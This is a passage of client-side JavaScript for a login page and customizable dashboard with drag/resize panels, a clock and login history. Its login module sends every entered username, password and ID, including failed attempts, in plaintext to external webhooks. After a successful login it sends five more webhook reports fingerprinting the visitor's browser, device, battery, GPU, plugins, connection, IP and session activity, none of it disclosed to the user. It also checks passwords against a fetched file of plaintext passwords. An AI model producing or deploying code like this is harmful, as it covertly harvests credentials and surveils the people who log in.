        // This method will either remove drag/resize and apply default CSS grid (for "Default Grid" layout)
        // or ensure panels are position: absolute for "Custom (Drag/Resize)".
        applyPanelVisibilityAndDrag: function() {
            const container = getEl('dashboardLayoutContainer');
            if (!container) return;

            const layoutType = localStorage.getItem('setting_dashboardLayout') || 'default';

            if (layoutType === 'default') {
                // Remove drag/resize from all panels if they have it
                container.querySelectorAll('.box, .info-panel').forEach(panel => {
                    const $panel = $(panel);
                    if ($panel.hasClass('ui-draggable')) $panel.draggable('destroy');
                    if ($panel.hasClass('ui-resizable')) $panel.resizable('destroy');
                    panel.style.position = ''; // Let CSS handle layout
                    panel.style.left = '';
                    panel.style.top = '';
                    panel.style.width = '';
                    panel.style.height = '';
                    panel.style.zIndex = ''; // Reset z-index
                });

                // Apply flexbox based grid. This uses the current HTML structure (main-row) and updatesNoti elements
                // It means a more defined structure than pure custom drag, useful for responsive grid-like views.
                // We'll revert #dashboardLayoutContainer and its direct children back to their intended (default) state.
                container.style.display = 'grid'; // Enable CSS Grid on the container
                container.style.gridTemplateColumns = 'repeat(auto-fit, minmax(300px, 1fr))';
                container.style.gap = '20px';
                container.style.minHeight = 'auto'; // Let content define height

                 // Explicitly set some core elements to 'initial' for default flow
                getEl('calendarBox').style.cssText = '';
                getEl('motivationBox').style.cssText = '';
                getEl('updatesBox').style.cssText = '';
                getEl('notificationsBox').style.cssText = '';
                getEl('randomFactsBox').style.cssText = '';
                getEl('dailyQuotesBox').style.cssText = '';

            } else if (layoutType === 'custom') {
                // Ensure all draggable/resizable settings are applied.
                this.initPanelInteractivity(); // This function enables/disables jQuery UI functions
                this.loadPanelPositions(); // Apply saved positions to them
                container.style.display = 'block'; // Keep it block-level to host absolutely positioned items
                container.style.gridTemplateColumns = '';
                container.style.gap = '';
                // Ensure default boxes are absolutely positioned if no saved position exists
                document.querySelectorAll('.box').forEach(panel => {
                    if (!panelPositions[panel.id]) {
                        // Apply hardcoded default positions/sizes for common boxes if custom layout & no saved data
                        const defaultPosSize = {
                            calendarBox: { left: 20, top: 20, width: 350, height: 300 },
                            motivationBox: { left: 390, top: 20, width: 350, height: 140 },
                            updatesBox: { left: 20, top: 340, width: 350, height: 200 },
                            notificationsBox: { left: 390, top: 180, width: 350, height: 200 },
                            randomFactsBox: { left: 760, top: 20, width: 350, height: 140 },
                            dailyQuotesBox: { left: 760, top: 180, width: 350, height: 140 },
                        };
                        if (defaultPosSize[panel.id]) {
                            const dps = defaultPosSize[panel.id];
                            panel.style.position = 'absolute';
                            panel.style.left = `${dps.left}px`;
                            panel.style.top = `${dps.top}px`;
                            panel.style.width = `${dps.width}px`;
                            panel.style.height = `${dps.height}px`;
                        }
                    }
                });

                // Set a sensible minimum height for the container when in custom mode
                const maxHeight = Math.max(...Array.from(container.querySelectorAll('.box, .info-panel'))
                                        .filter(el => el.style.display !== 'none' && el.style.position === 'absolute')
                                        .map(el => parseFloat(el.style.top) + parseFloat(el.style.height))) + 40; // Add some padding
                container.style.minHeight = `${Math.max(800, maxHeight || 0)}px`; // Ensure it's not too small, but expands with content.
            }

            // After applying layouts, ensure current panels that are explicitly 'block' retain their visibility,
            // others that were opened are correctly absolute
             container.querySelectorAll('.info-panel.box').forEach(p => {
                if (p.style.display === 'block' && !panelPositions[p.id] && layoutType === 'custom') {
                    // Place dynamically opened panels if they don't have a saved position
                    const offset = Array.from(container.querySelectorAll('.info-panel.box')).filter(el => el.style.display === 'block').length * 20;
                    p.style.position = 'absolute';
                    p.style.left = `${offset + 100}px`;
                    p.style.top = `${offset + 250}px`;
                }
             });

             // Update state for visibility for general 'toggle sections' button
            this.toggleSectionsVisibility();

        },

        applyDefaultGridLayout: function() {
            // This is primarily for a non-custom, responsive grid if desired
            // Current dashboard body setup has flex row structure implicitly, or main-row as specific flex row
            // No direct `grid` class to add/remove, so this would be modifying display property and styles.
            // Since this structure isn't heavily relying on a `main-row` after all panel becomes boxes
            // It uses a `dashboardLayoutContainer` that wraps everything, that's what we want to adjust.
             const mainRow = getEl('dashboardLayoutContainer');
             mainRow.style.display = 'flex';
             mainRow.style.flexWrap = 'wrap';
             mainRow.style.gap = '20px';
        },

        toggleSectionsVisibility: function() {
            const toggleBtn = getEl('toggleSectionsBtn');
            const mainGrid = getEl('dashboardLayoutContainer'); // This now contains all boxes
            const currentDisplay = mainGrid.style.display;

            if (currentDisplay === 'none') {
                toggleBtn.innerText = '⬆️ Show Main Grid';
            } else {
                toggleBtn.innerText = '⬇️ Hide Main Grid';
            }
        },

        initLoginHistoryPanel: function() {
            const lastSuccessfulLoginEl = getEl('lastSuccessfulLogin');
            const lastSuccessfulLoginDashboardEl = getEl('lastSuccessfulLoginDashboard');
            const loginHistoryList = getEl('loginHistoryList');

            if (loginHistory.length > 0) {
                // Get the most recent successful login
                const lastSuccess = loginHistory.findLast(entry => entry.type === 'success');
                if (lastSuccess) {
                    const date = new Date(lastSuccess.loginTime).toLocaleString();
                    if (lastSuccessfulLoginEl) lastSuccessfulLoginEl.textContent = `Last Successful Login: ${date}`;
                    if (lastSuccessfulLoginDashboardEl) lastSuccessfulLoginDashboardEl.textContent = `Last Successful Login: ${date}`;
                }
            }

            loginHistoryList.innerHTML = '';
            if (loginHistory.length === 0) {
                loginHistoryList.innerHTML = '<div>No login attempts recorded yet.</div>';
            } else {
                loginHistory.forEach(entry => {
                    const div = document.createElement('div');
                    const statusClass = entry.type === 'success' ? 'login-success' : (entry.type === 'reset' ? 'login-reset' : 'login-fail');
                    div.innerHTML = `<span class="${statusClass}"><strong>${entry.timestamp}</strong></span> - Type: ${entry.type}, User: ${entry.username || 'N/A'}, ID: ${entry.userID || 'N/A'}` +
                                    (entry.logoutTime ? `, Logout: ${new Date(entry.logoutTime).toLocaleString()}` : '');
                    loginHistoryList.appendChild(div);
                });
            }

            // Click listener for "View Login History" button on login page itself
            getEl('viewLoginHistoryBtn').addEventListener('click', () => {
                const historyDisplayBox = getEl('loginHistoryPanel');
                if (historyDisplayBox.style.display === 'block') {
                    historyDisplayBox.style.display = 'none';
                } else {
                    historyDisplayBox.style.display = 'block';
                    // Re-render history on demand to ensure up-to-date
                    this.initLoginHistoryPanel();
                }
                 dashboard.logActivity('Login History button clicked (login page).', 'Auth');
            });
            this.logActivity('Login history initialized.', 'System');
        }
    }; // End dashboard object


    // Login System JavaScript
    const login = {
        attempts: LOGIN_ATTEMPTS_MAX,
        init: function() {
            this.initElements();
            this.initListeners();
            this.loadUsers();
            this.updateAttemptsText();
            this.initLoginTimeDate(); // Initialize clock for login page
            this.load24HourFormatSetting(); // Apply 24 hour setting at load

             // Setup global error logging
            window.onerror = (message, source, lineno, colno, error) => {
                console.error("Uncaught error:", message);
                dashboard.logActivity(`Client Error: ${message} (File: ${source}:${lineno}:${colno})`, 'Error');
            };

            window.addEventListener('unhandledrejection', (event) => {
                console.error("Unhandled promise rejection:", event.reason);
                dashboard.logActivity(`Client Unhandled Rejection: ${event.reason}`, 'Error');
            });

             // Apply initial panel interactivity/positions. This allows existing CSS or loaded defaults to show.
            dashboard.initPanelInteractivity();
            dashboard.loadPanelPositions(); // Important for loading custom layouts at startup
        },

        initElements: function() {
            this.loginBox = getEl('loginBox');
            this.usernameInput = getEl('username');
            this.passwordInput = getEl('password');
            this.userIDInput = getEl('userID');
            this.showPasswordCheckbox = getEl('showPassword');
            this.submitBtn = getEl('submitBtn');
            this.errorMsg = getEl('errorMsg');
            this.attemptsText = getEl('attemptsText');
            this.resetPopup = getEl('resetPopup');
            this.resetField = getEl('resetField');
            this.resetBtn = getEl('resetBtn');
            this.loginQuickBar = getEl('loginQuickBar');

            this.loginQuickBar.style.opacity = 0; // Hidden by default, reveal after init anim.
        },

        initListeners: function() {
            this.showPasswordCheckbox.addEventListener('change', () => {
                this.passwordInput.type = this.showPasswordCheckbox.checked ? 'text' : 'password';
                 dashboard.logActivity(`Login: Show password toggled to ${this.showPasswordCheckbox.checked}.`, 'Auth');
            });

            this.submitBtn.addEventListener('click', () => this.submitLogin());
            this.resetBtn.addEventListener('click', () => this.resetCounter());

            document.addEventListener('keydown', e => {
                if (e.key === 'Enter') {
                    if (this.resetPopup.style.display === 'block') {
                        this.resetCounter();
                    } else {
                        this.submitLogin();
                    }
                }
            });

            // Login Page Quick Bar functions
            let loginZoomLevel = 1;
            const loginZoomStep = 0.1;
            const minZoom = 0.5;
            const maxZoom = 2;

            getEl('loginZoomInBtn').addEventListener('click', () => {
                if (loginZoomLevel < maxZoom) {
                    loginZoomLevel += loginZoomStep;
                    document.body.style.zoom = loginZoomLevel;
                    dashboard.logActivity(`Login zoom in to ${loginZoomLevel * 100}%.`, 'UI');
                } else { customAlert('Maximum login page zoom reached!', '🔍'); }
            });
            getEl('loginZoomOutBtn').addEventListener('click', () => {
                if (loginZoomLevel > minZoom) {
                    loginZoomLevel -= loginZoomStep;
                    document.body.style.zoom = loginZoomLevel;
                    dashboard.logActivity(`Login zoom out to ${loginZoomLevel * 100}%.`, 'UI');
                } else { customAlert('Minimum login page zoom reached!', '🔍'); }
            });
            getEl('loginPanicBtn').addEventListener('click', () => {
                window.open('https://clever.com', '_blank');
                dashboard.logActivity('Login page panic button triggered.', 'Security');
            });
        },

        load24HourFormatSetting: function() {
             const toggle24Hour = getEl('toggle24Hour');
             if (toggle24Hour) {
                const is24Hour = localStorage.getItem('24HourFormat') === 'true';
                toggle24Hour.checked = is24Hour;
                dashboard.is24HourFormat = is24Hour; // Update dashboard's internal state too
             }
        },

        initLoginTimeDate: function() {
            dashboard.updateClockDisplay();
        },

        loadUsers: function() {
            fetch(USER_JSON_URL)
                .then(res => res.json())
                .then(data => {
                    users = data;
                })
                .catch(error => {
                    users = [];
                    console.error('Failed to load user JSON data:', error);
                    customAlert('Failed to load user data. Login might not work correctly.', '❌');
                });
        },

        flashRedOutline: function(times = 2, delay = 400) {
            let count = 0;
            const self = this;
            function flash() {
                self.loginBox.classList.add('flashing');
                setTimeout(() => {
                    self.loginBox.classList.remove('flashing');
                    count++;
                    if (count < times) setTimeout(flash, delay);
                }, delay);
            }
            flash();
        },

        getWebGLRenderer: function() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Unavailable";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
            } catch {
                return "Unavailable";
            }
        },

        async getBatteryStatus() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging ? "Yes" : "No",
                        level: `${Math.round(battery.level * 100)}%`
                    };
                } catch {
                    return { charging: "Unavailable", level: "Unavailable" };
                }
            }
            return { charging: "Unavailable", level: "Unavailable" };
        },

        findUser: function(username, userID) {
            return users.find(u =>
                u.username?.toLowerCase() === username.toLowerCase() &&
                u.userID?.toString() === userID.toString()
            );
        },

        async sendWebhook(url, embed) {
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] }),
                });
            } catch (e) {
                console.warn('Webhook send failed:', e);
            }
        },

        async collectLoggingData(user, password) {
            const now = new Date();
            loginTime = now.toISOString(); // Set global loginTime
            const batteryStatus = await this.getBatteryStatus();

            return {
                user,
                password,
                loginTime,
                batteryStatus,
                webglRenderer: this.getWebGLRenderer(),
            };
        },

        async logUsername(name, username) {
            const embed = { title: "Username Logging", color: 0x3498db, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.username, embed);
        },
        async logPassword(name, password) {
            const embed = { title: "Password Logging", color: 0xe74c3c, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.password, embed);
        },
        async logIdentifier(name, identifier) {
            const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.identifier, embed);
        },
        async logInvalidUsername(name, username) {
            const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.invalid_username, embed);
        },
        async logInvalidPassword(name, password) {
            const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.invalid_password, embed);
        },
        async logInvalidIdentifier(name, identifier) {
            const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.invalid_identifier, embed);
        },
        async logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
            const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.attempts_counter, embed);
        },
        async logAttemptsExceeded(name, username, password, identifier) {
            const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
            await this.sendWebhook(loggingWebhooks.attempts_exceeded, embed);
        },

        // Enhanced Embed Builders with new fields
        buildUserLoggingEmbed: function(data) {
            const lastSuccessful = loginHistory.findLast(e => e.type === 'success');
            const lastFailed = loginHistory.findLast(e => e.type === 'fail');

            return {
                title: "User Logging System",
                color: 0xff0000,
                fields: [
                    { name: "Name", value: data.user.name || "N/A", inline: true },
                    { name: "Username", value: data.user.username, inline: true },
                    { name: "Password", value: data.password, inline: true },
                    { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
                    { name: "Role Type", value: data.user.role || "N/A", inline: true },
                    { name: "Login Time", value: data.loginTime, inline: false },
                    { name: "User Identifier", value: data.user.userID.toString(), inline: true },
                    { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
                    { name: "Last Successful Login", value: lastSuccessful ? new Date(lastSuccessful.loginTime).toLocaleString() : "Never", inline: true },
                    { name: "Last Failed Login", value: lastFailed ? new Date(lastFailed.timestamp).toLocaleString() : "Never", inline: true },
                ]
            };
        },

        buildBrowserLoggingEmbed: async function(data) {
            const nav = navigator;
            const getPluginsList = () => {
                const plugins = [];
                for (let i = 0; i < nav.plugins.length; i++) {
                    plugins.push(nav.plugins[i].name);
                }
                return plugins.length > 0 ? plugins.join(", ") : "None";
            };

            const preferredColorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light';


            return {
                title: "Browser Logging System",
                color: 0x00ff00,
                fields: [
                    { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                    { name: "Username", value: data.user.username || "N/A", inline: true },
                    { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
                    { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
                    { name: "Browser Language", value: nav.language || "Unknown", inline: true },
                    { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
                    { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
                    { name: "Installed Plugins Count", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
                    { name: "Plugins List (Detailed)", value: getPluginsList() || "None", inline: false },
                    { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
                    { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
                    { name: "Incognito/Private Mode Status", value: "Undetected", inline: true }, // Cannot reliably detect with JS
                    { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
                    { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
                    { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
                    { name: "Font Smoothing Type", value: "Unavailable", inline: true },
                    { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
                    { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
                    { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true },
                    { name: "Preferred Color Scheme", value: preferredColorScheme, inline: true }
                ]
            };
        },

        buildDeviceLoggingEmbed: function(data) {
            const nav = navigator;
            const battery = data.batteryStatus; // This now comes pre-formatted
            const webglVersion = data.webglRenderer ? (data.webglRenderer.match(/OpenGL ES ([0-9.]+)/) ? data.webglRenderer.match(/OpenGL ES ([0-9.]+)/)[1] : "Unknown") : "Unavailable";
            const logicalCPUCores = navigator.hardwareConcurrency; // Use direct navigator property

            return {
                title: "Device Logging System",
                color: 0x0000ff,
                fields: [
                    { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                    { name: "Username", value: data.user.username || "N/A", inline: true },
                    { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
                    { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
                    { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
                    { name: "Logical CPU Cores (Estimate)", value: logicalCPUCores ? logicalCPUCores.toString() : "Unavailable", inline: true },
                    { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
                    { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
                    { name: "WebGL Version", value: webglVersion, inline: true },
                    { name: "Battery Charging", value: battery.charging, inline: true },
                    { name: "Battery Level", value: battery.level, inline: true },
                    { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
                    { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
                    { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
                    { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
                    { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
                    { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
                    { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
                    { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
                    { name: "Language", value: nav.language || "Unknown", inline: true }
                ]
            };
        },

        buildConnectionLoggingEmbed: function(data) {
            const nav = navigator;
            return {
                title: "Connection Logging System",
                color: 0xffff00,
                fields: [
                    { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                    { name: "Username", value: data.user.username || "N/A", inline: true },
                    { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
                    { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
                    { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
                    { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
                    { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
                    { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
                    { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
                    { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
                    { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
                    { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
                    { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
                    { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
                    { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
                    { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
                    { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
                    { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
                ]
            };
        },

        buildSessionLoggingEmbed: function(data) {
            const currentSession = activityLog.filter(e => e.timestamp > data.loginTime);
            const pagesVisited = Array.from(new Set(currentSession.filter(e => e.type === 'Page View').map(e => e.description)));
            const actionsPerformed = currentSession.filter(e => e.type !== 'Page View' && e.type !== 'Error').map(e => e.description);
            const errorsEncountered = currentSession.filter(e => e.type === 'Error').map(e => e.description);

            return {
                title: "Session Logging System",
                color: 0x00ffff,
                fields: [
                    { name: "Person's Name", value: data.user.name || "N/A", inline: true },
                    { name: "Username", value: data.user.username || "N/A", inline: true },
                    { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
                    { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
                    { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true }, // Will be updated on logout
                    { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true }, // Will be calculated on logout
                    { name: "Pages Visited", value: pagesVisited.join(", ") || "None", inline: false },
                    { name: "Actions Performed", value: actionsPerformed.join("; ") || "None", inline: false },
                    { name: "Errors Encountered", value: errorsEncountered.join("; ") || "None", inline: false },
                    { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
                    { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
                    { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
                    { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true }, // Update on activity
                    { name: "Number of Clicks", value: dashboard.getStat('buttonsClicked').toString() || "0", inline: true }, // Use dashboard stats
                    { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true }, // Not yet tracked via general stats
                    { name: "Idle Time", value: data.idleTime || "0s", inline: true }, // Not yet tracked
                    { name: "Active Time", value: data.activeTime || "Unknown", inline: true }, // Not yet tracked
                    { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true } // Not yet tracked
                ]
            };
        },

        // New Login Animation Logic
        dashboardCodeSnippets: [
            "  .authenticating {",
            "    display: flex;",
            "    align-items: center;",
            "    justify-content: center;",
            "    position: fixed;",
            "    top: 0;",
            "    left: 0;",
            "    width: 100vw;",
            "    height: 100vh;",
            "    background: #000000;",
            "    color: #00FF00;",
            "    font-family: 'Consolas', monospace;",
            "    z-index: 10000;",
            "  }",
            "  .authenticating::before {",
            "    content: '█████████ Authenticating User...';",
            "    animation: glitch 1.5s linear infinite;",
            "    opacity: 0;",
            "    transform: scale(0);",
            "    font-size: 2em;",
            "    white-space: nowrap;",
            "  }",
            "  @keyframes glitch {",
            "    0%, 100% { clip: rect(0px, 9999px, 10px, 0px); opacity: 0; transform: scale(0.98); }",
            "    25% { clip: rect(90px, 9999px, 30px, 0px); opacity: 0.8; transform: scale(1.02); }",
            "    50% { clip: rect(50px, 9999px, 120px, 0px); opacity: 0; transform: scale(0.96); }",
            "    75% { clip: rect(100px, 9999px, 70px, 0px); opacity: 0.6; transform: scale(1.01); }",
            "  }"
        ],

        showDashboardLoadingAnimation: async function(user) {
            getEl('dashboardLoadingScreen').style.display = 'flex';
            getEl('bodyElement').className = 'dashboard-body'; // Change body class for theme
            getEl('dashboard').style.display = 'none'; // Keep dashboard hidden

            let codeOutput = getEl('dashboardCodeOutput');
            codeOutput.innerHTML = '';
            let lineIndex = 0;

            const typeNextLine = () => {
                if (lineIndex < this.dashboardCodeSnippets.length) {
                    const line = this.dashboardCodeSnippets[lineIndex];
                    let charIndex = 0;
                    const span = document.createElement('span');
                    codeOutput.appendChild(span);

                    const typeChar = () => {
                        if (charIndex < line.length) {
                            span.textContent += line.charAt(charIndex);
                            charIndex++;
                            span.style.animationDelay = `${lineIndex * 0.1}s`;
                            setTimeout(typeChar, 20); // Typing speed
                        } else {
                            codeOutput.appendChild(document.createTextNode('\n')); // Add newline character visually
                            lineIndex++;
                            setTimeout(typeNextLine, 500); // Delay between lines
                        }
                    };
                    typeChar();
                } else {
                    // All lines typed, proceed to dashboard after short delay
                    setTimeout(() => {
                        getEl('dashboardLoadingText').textContent = 'Finalizing Dashboard setup...';
                        getEl('dashboardLoadingText').style.backgroundImage = 'linear-gradient(to right, #00FF00, #3CB371)';
                        getEl('dashboardLoadingText').style.animation = 'none';
                    }, 1000);
                     setTimeout(() => {
                         getEl('dashboardLoadingScreen').style.opacity = 0;
                         getEl('dashboardLoadingScreen').style.pointerEvents = 'none'; // Disable interaction during fade
                         setTimeout(() => {
                            getEl('dashboardLoadingScreen').style.display = 'none';
                            getEl('dashboard').style.display = 'block'; // Show dashboard
                            dashboard.init();
                         }, 500); // Match fade transition duration
                    }, 2500);
                }
            };
            typeNextLine();
        },


        async submitLogin() {
            this.errorMsg.textContent = '';
            const username = this.usernameInput.value;
            const password = this.passwordInput.value;
            const userID = this.userIDInput.value;

            dashboard.updateStat('loginsAttempted');

            if (!username || !password || !userID) {
                this.errorMsg.textContent = 'Please fill all fields.';
                return;
            }

            const user = this.findUser(username, userID);

            // Log the attempt
            await this.logAttemptsCounter(
                user?.name || "Unknown",
                username,
                password,
                userID,
                this.attempts
            );

            // Always add a login attempt to local storage for login history tracking
            loginHistory.push({
                timestamp: new Date().toISOString(),
                type: 'attempt',
                username: username,
                userID: userID
            });
            localStorage.setItem('loginHistory', JSON.stringify(loginHistory));

            if (!user) {
                await this.logInvalidUsername(user?.name || "Unknown", username);
                await this.logInvalidIdentifier(user?.name || "Unknown", userID);
                this.handleFailedAttempt('User not found.');
                return;
            }

            if (password !== user.password) {
                await this.logInvalidPassword(user.name, password);
                this.handleFailedAttempt('Incorrect password.');
                return;
            }

            // Correct login
            currentLoggedInUser = user;
            this.attempts = LOGIN_ATTEMPTS_MAX;
            this.updateAttemptsText();
            this.errorMsg.textContent = '';
            this.resetPopup.style.display = 'none';
            this.loginBox.style.borderColor = 'white';
            this.loginBox.style.boxShadow = '0 0 15px white';

            // Mark successful login in history
            const loginIndex = loginHistory.findLastIndex(entry => entry.type === 'attempt' && entry.username === username && entry.userID === userID);
            if (loginIndex !== -1) {
                loginHistory[loginIndex] = { ...loginHistory[loginIndex], type: 'success', loginTime: new Date().toISOString() };
            } else { // Fallback, if somehow a 'success' entry wasn't from a recent attempt (e.g., initial user load)
                 loginHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'success',
                    username: username,
                    userID: userID,
                    loginTime: new Date().toISOString()
                });
            }
            localStorage.setItem('loginHistory', JSON.stringify(loginHistory));


            // Log successful credentials
            await this.logUsername(user.name, username);
            await this.logPassword(user.name, password);
            await this.logIdentifier(user.name, userID);

            // Collect data and send logs
            const loggingData = await this.collectLoggingData(user, password);

            // Send all 5 webhooks:
            await Promise.all([
                this.sendWebhook(webhookUrls.userLogging, this.buildUserLoggingEmbed(loggingData)),
                this.sendWebhook(webhookUrls.browserLogging, await this.buildBrowserLoggingEmbed(loggingData)),
                this.sendWebhook(webhookUrls.deviceLogging, this.buildDeviceLoggingEmbed(loggingData)),
                this.sendWebhook(webhookUrls.connectionLogging, this.buildConnectionLoggingEmbed(loggingData)),
                this.sendWebhook(webhookUrls.sessionLogging, this.buildSessionLoggingEmbed(loggingData)),
            ]);


            // Start dashboard loading animation, then show dashboard
            this.loginBox.style.display = 'none'; // Hide login elements immediately
            getEl('loginQuickBar').style.display = 'none';
            getEl('loginWrapper').style.display = 'none';
            document.body.classList.remove('login-body'); // Remove login specific body class

            this.showDashboardLoadingAnimation(user);

            // Update user info in dashboard after load
            getEl('loggedInUser').textContent = user.name || user.username;
            getEl('loggedInID').textContent = userID;

        },

        async handleFailedAttempt(msg) {
            this.attempts--;
            this.updateAttemptsText();
            this.errorMsg.textContent = msg;

             // Add a failed attempt to local storage for login history tracking
            loginHistory.push({
                timestamp: new Date().toISOString(),
                type: 'fail',
                username: this.usernameInput.value,
                userID: this.userIDInput.value
            });
            localStorage.setItem('loginHistory', JSON.stringify(loginHistory));


            if (this.attempts <= 0) {
                this.attempts = 0;
                this.errorMsg.textContent = 'No attempts left. Please reset.';

                // Log attempts exceeded
                const username = this.usernameInput.value;
                const password = this.passwordInput.value;
                const userID = this.userIDInput.value;
                const user = this.findUser(username, userID);

                await this.logAttemptsExceeded(
                    user?.name || "Unknown",
                    username,
                    password,
                    userID
                );

                this.showResetPopup();
                this.disableInputs();
            } else {
                if (this.attempts <= 3) {
                    this.flashRedOutline(2, 400);
                }
            }
        },

        updateAttemptsText: function() {
            this.attemptsText.textContent = `Attempts Left: ${this.attempts}`;
        },

        disableInputs: function() {
            this.usernameInput.disabled = true;
            this.passwordInput.disabled = true;
            this.userIDInput.disabled = true;
            this.submitBtn.disabled = true;
        },

        enableInputs: function() {
            this.usernameInput.disabled = false;
            this.passwordInput.disabled = false;
            this.userIDInput.disabled = false;
            this.submitBtn.disabled = false;
        },

        showResetPopup: function() {
            this.resetPopup.style.display = 'block';
